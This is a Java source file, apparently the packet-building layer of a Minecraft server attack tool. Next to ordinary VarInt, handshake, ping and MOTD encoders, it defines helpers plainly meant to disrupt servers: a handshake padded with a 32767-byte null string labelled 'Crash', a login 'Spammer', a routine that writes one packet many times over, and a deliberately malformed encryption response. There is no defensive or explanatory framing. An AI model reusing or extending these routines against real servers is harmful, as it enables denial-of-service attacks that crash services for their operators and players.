package IO.SYVERIS.utils;

import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;

public class PacketUtils {
   public static void writeVarInt(DataOutputStream out, int value) throws IOException {
      while((value & -128) != 0) {
         out.writeByte(value & 127 | 128);
         value >>>= 7;
      }

      out.writeByte(value);
   }

   public static void writeString(DataOutputStream out, String value) throws IOException {
      byte[] data = value.getBytes(StandardCharsets.UTF_8);
      writeVarInt(out, data.length);
      out.write(data, 0, data.length);
   }

   public static int readVarInt(DataInputStream in) throws IOException {
      int i = 0;
      int j = 0;

      byte k;
      do {
         k = in.readByte();
         i |= (k & 127) << j++ * 7;
         if (j > 5) {
            throw new RuntimeException("VarInt too big");
         }
      } while((k & 128) == 128);

      return i;
   }

   public static byte[] createHandshakePacketCrash(String ip, int port, int protocol) throws IOException {
      ByteArrayOutputStream bytes = new ByteArrayOutputStream();
      DataOutputStream out = new DataOutputStream(bytes);
      writeHandshakePacket(out, new String(new byte[32767]), port, protocol, 2);
      byte[] data = bytes.toByteArray();
      bytes.close();
      return data;
   }

   public static String readString(DataInputStream in) throws IOException {
      int len = readVarInt(in);
      byte[] data = new byte[len];
      in.readFully(data);
      return new String(data, 0, len, StandardCharsets.UTF_8);
   }

   public static void writeHandshakePacket(DataOutputStream out, String ip, int port, int protocol, int state) throws IOException {
      writeVarInt(out, 0);
      writeVarInt(out, protocol);
      writeString(out, ip);
      out.writeShort(port);
      writeVarInt(out, state);
   }

   public static void writeQueryRequestPacket(DataOutputStream out) throws IOException {
      writeVarInt(out, 0);
   }

   public static void writePingPacket(DataOutputStream out, long clientTime) throws IOException {
      writeVarInt(out, 1);
      out.writeLong(clientTime);
   }

   public static void writePacket(byte[] packetData, DataOutputStream out) throws IOException {
      writeVarInt(out, packetData.length);
      out.write(packetData);
   }

   public static String readServerDataPacket(DataInputStream in) throws IOException {
      byte id = in.readByte();
      return id != 0 ? null : readString(in);
   }

   public static void writePacketSomeTimes(byte[] packetData, DataOutputStream out, int times) throws IOException {
      ByteArrayOutputStream LoginOutPutStream = null;
      LoginOutPutStream = new ByteArrayOutputStream();
      DataOutputStream login = new DataOutputStream(LoginOutPutStream);
      writeVarInt(login, packetData.length);
      login.write(packetData);
      byte[] bytes = LoginOutPutStream.toByteArray();

      for(int i = 0; i < times; ++i) {
         out.write(bytes);
      }

   }

   public static long readPongPacket(DataInputStream in) throws IOException {
      byte id = in.readByte();
      return id != 1 ? -1L : in.readLong();
   }

   public static byte[] createHandshakePacket(String ip, int port, int protocol) throws IOException {
      ByteArrayOutputStream bytes = new ByteArrayOutputStream();
      DataOutputStream out = new DataOutputStream(bytes);
      writeHandshakePacket(out, ip, port, protocol, 2);
      byte[] data = bytes.toByteArray();
      bytes.close();
      return data;
   }

   public static byte[] createPingPacket() throws IOException {
      ByteArrayOutputStream bytes = new ByteArrayOutputStream();
      DataOutputStream out = new DataOutputStream(bytes);
      writePingPacket(out, System.currentTimeMillis());
      byte[] data = bytes.toByteArray();
      bytes.close();
      return data;
   }

   public static byte[] createHandshakePacketBroke(String ip, int port, int protocol) throws IOException {
      ByteArrayOutputStream bytes = new ByteArrayOutputStream();
      DataOutputStream out = new DataOutputStream(bytes);
      writeHandshakePacket(out, ip, port, protocol, 2);
      byte[] data = bytes.toByteArray();
      bytes.close();
      return data;
   }

   public static byte[] createLoginPacket() throws IOException {
      ByteArrayOutputStream bytes = new ByteArrayOutputStream();
      DataOutputStream out = new DataOutputStream(bytes);
      writeVarInt(out, 0);
      writeString(out, RandomUtils.randomString(16));
      byte[] data = bytes.toByteArray();
      bytes.close();
      return data;
   }

   public static byte[] createChatPacket(String text) throws IOException {
      ByteArrayOutputStream bytes = new ByteArrayOutputStream();
      DataOutputStream out = new DataOutputStream(bytes);
      writeVarInt(out, 1);
      writeString(out, text);
      out.close();
      return bytes.toByteArray();
   }

   public static byte[] createLoginPacketSpammer() throws IOException {
      ByteArrayOutputStream bytes = new ByteArrayOutputStream();
      DataOutputStream out = new DataOutputStream(bytes);
      writeVarInt(out, 0);
      writeString(out, "♦♦♦♦♦♦");
      byte[] data = bytes.toByteArray();
      bytes.close();
      return data;
   }

   public static void writeEncryptionResponseKapputt(DataOutputStream lol) throws IOException {
      ByteArrayOutputStream stream = null;
      stream = new ByteArrayOutputStream();
      DataOutputStream out = new DataOutputStream(stream);
      writeVarInt(out, 1);
      byte[] byArray = new byte[]{9, -23, 21, 3, 123, 32, 34, 0, 45, -34, 4, 34, 4, 56, 34};
      writeVarInt(out, byArray.length);
      out.write(byArray);
      writeVarInt(out, byArray.length);
      out.write(byArray);
      byte[] r = stream.toByteArray();
      writeVarInt(lol, r.length);
      lol.write(r, 0, r.length);
   }

   public static byte[] createEncryptionResponsePacket(byte[] encryptedKey, byte[] encryptedVerifyToken) throws IOException {
      ByteArrayOutputStream bytes = new ByteArrayOutputStream();
      DataOutputStream out = new DataOutputStream(bytes);
      writeVarInt(out, 1);
      writeByteArray(out, encryptedKey);
      writeByteArray(out, encryptedVerifyToken);
      byte[] data = bytes.toByteArray();
      bytes.close();
      return data;
   }

   public static byte[] createLoginPacketBroke() throws IOException {
      ByteArrayOutputStream bytes = new ByteArrayOutputStream();
      DataOutputStream out = new DataOutputStream(bytes);
      writeVarInt(out, 0);
      writeString(out, RandomUtils.randomString(16));
      byte[] data = bytes.toByteArray();
      bytes.close();
      return data;
   }

   public static byte[] createHandshakeMOTDPacket(String ip, int port, int protocol) throws IOException {
      ByteArrayOutputStream bytes = new ByteArrayOutputStream();
      DataOutputStream out = new DataOutputStream(bytes);
      writeHandshakePacket(out, ip, port, protocol, 1);
      byte[] data = bytes.toByteArray();
      bytes.close();
      return data;
   }

   public static byte[] createLegacyMOTDPacket(String ip, int port) throws IOException {
      ByteArrayOutputStream bytes = new ByteArrayOutputStream();
      DataOutputStream out = new DataOutputStream(bytes);
      out.write(254);
      out.write(1);
      out.write(250);
      char[] achar = "MC|BEdit".toCharArray();
      out.writeShort(achar.length);
      char[] cArray = achar;
      int n = achar.length;

      for(int n2 = 0; n2 < n; ++n2) {
         char c = cArray[n2];
         out.writeChar(c);
      }

      out.writeShort(7 + 2 * ip.length());
      out.write(127);
      char[] ipdata = ip.toCharArray();
      out.writeShort(ip.length());
      char[] cArray2 = ipdata;
      int n3 = ipdata.length;

      for(n = 0; n < n3; ++n) {
         char c = cArray2[n];
         out.writeChar(c);
      }

      out.writeInt(port);
      byte[] data = bytes.toByteArray();
      bytes.close();
      return data;
   }

   public static byte[] readByteArray(DataInputStream in) throws IOException {
      int len = readVarInt(in);
      byte[] data = new byte[len];
      in.readFully(data);
      return data;
   }

   public static void writeByteArray(DataOutputStream out, byte[] data) throws IOException {
      writeVarInt(out, data.length);
      out.write(data, 0, data.length);
   }
}
